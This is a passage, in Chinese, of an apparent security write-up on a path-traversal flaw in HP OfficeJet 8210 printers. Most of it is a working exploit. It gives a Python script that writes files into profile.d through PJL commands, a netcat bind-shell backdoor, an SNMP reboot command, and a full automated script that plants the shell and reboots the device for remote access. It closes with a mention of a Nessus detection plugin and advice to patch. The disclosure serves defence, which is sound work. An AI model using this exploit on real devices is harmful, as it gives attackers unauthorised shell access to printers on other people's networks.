图11
测试结果和我们预期很相似，0:/../../rw/var/etc/profile.d/ 目录中存在和传统Linux 上profile.d目录中类似的数据。
为了测试是否真的可以通过 0:/ filesystem将自定义文件写入0:/../../rw/var/etc/profile.d/
目录中，我们修改了上面的python代码，修改后的代码如下：
    import socket
        import sys
        test = ('test')
        if len(sys.argv) != 3:
            print 'nUsage:upload.py [ip] [port]n'
            sys.exit()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_address = (sys.argv[1], int(sys.argv[2]))
        print 'connecting to %s port %s' % server_address
        sock.connect(server_address)
        dir_query = '@PJL FSDOWNLOAD FORMAT:BINARY SIZE=' + str(len(test)) + ' NAME="0:/../../rw/var/etc/profile.d/writing_test"rn
        dir_query += test
        dir_query += 'x1b%-12345X'
        sock.sendall(dir_query)
        sock.close()
然后我们开始测试，结果如图12所示：
图12
是的，你没看错，脚本执行成功，文件写入成功，而且我们还可以通过目录遍历漏洞查看到写入的文件。
Ok，现在我们已经向profile.d目录中写入了脚本文件，我们知道，profile.d目录下的文件很可能是打印机系统启动的时候自动启动的文件，我们离成功复现任意代码执行漏洞只差一步之遥了。接下来，我们要做的就是写入一个反弹shell的脚本，然后重启打印机。
我们已经知道打印机上安装了netcat 工具，所以我们编写了一个利用nc反弹shell的脚本，如下：
    if [ ! -p /tmp/pwned ]; then
            mkfifo /tmp/pwned
            cat /tmp/pwned | /bin/sh 2>&1 | /usr/bin/nc -l 1270 > /tmp/pwned &
        fi
好了，后门脚本已经ok，接下来就是如何远程重启打印机了，其中给一个方法就是利用web界面上的工具菜单下的重启按钮重启打印机，另一个方法就是利用SNMP
协议的 printer MIB去重启打印机，如下：
     albinolobster@ubuntu:~$ snmpset -v1 -c public 192.168.1.158 1.3.6.1.2.1.43.5.1.1.3.1 i 4
        iso.3.6.1.2.1.43.5.1.1.3.1 = INTEGER: 4
下面我们又编写了一个自动化反弹shell的脚本，这个脚本集成了向profile.d目录写入反弹shell后门，重启打印机设备的功能，脚本内容如下：
     # Create a bind shell on an unpatched OfficeJet 8210
        # Write a script to profile.d and reboot the device. When it comes
        # back online then nc to port 1270.
        #
        # easysnmp instructions:
        # sudo apt-get install libsnmp-dev
        # pip install easysnmp
        ##
        import socket
        import sys
        from easysnmp import snmp_set
        profile_d_script = ('if [ ! -p /tmp/pwned ]; thenn'
                            'tmkfifo /tmp/pwnedn'
                            'tcat /tmp/pwned | /bin/sh 2>&1 | /usr/bin/nc -l 1270 > /tmp/pwned &n
                            'fin')
        if len(sys.argv) != 3:
            print 'nUsage:upload.py [ip] [port]n'
            sys.exit()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        server_address = (sys.argv[1], int(sys.argv[2]))
        print 'connecting to %s port %s' % server_address
        sock.connect(server_address)
        dir_query = '@PJL FSDOWNLOAD FORMAT:BINARY SIZE=' + str(len(profile_d_script)) + ' NAME="0:/../../rw/var/etc/profile.d/lol.sh"rn'
        dir_query += profile_d_script
        dir_query += 'x1b%-12345X'
        sock.sendall(dir_query)
        sock.close()
        sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock1.connect(server_address)
        dir_query = '@PJL FSQUERY NAME="0:/../../rw/var/etc/profile.d/lol.sh"rn'
        sock1.sendall(dir_query)
        response = ''
        while True:
            data = sock1.recv(1)
            if 'n' == data: break
            response += data
        print response
        snmp_set('.1.3.6.1.2.1.43.5.1.1.3.1', 4, 'integer', hostname='192.168.1.158', community='public', version=1)
        print 'Done! Try port 1270 in ~30 seconds'
直接执行这个脚本，然后用nc 192.168.1.158 1270 命令连接打印机，等待30s左右，然后就会成功获取远程打印机的shell环境。  
 **  
**
**0x02. Tenable 公司针对此安全漏洞的处理方案  
**
如果你理解了这个漏洞的原理和攻击手段， 你就很容易检测出设备是否存在相应的漏洞。 Tenable
公司已经在5月下旬的时候发布了一个检测此漏洞的[Nessus插件](https://www.tenable.com/plugins/index.php?view=single&id=100461)，
在这个插件中，我们做了一些小的修改，这些修改会让Nessus在扫描打印的时候不会触发打印机通过9100端口打印，这个举动也会让我们广大的客户放心地进行打印机扫描。
总而言之，多花点时间关心下你的打印机安全吧，我们应该像对待电脑一样对待打印机的安全问题，定期地对它们进进行扫描，并给它们更新补丁。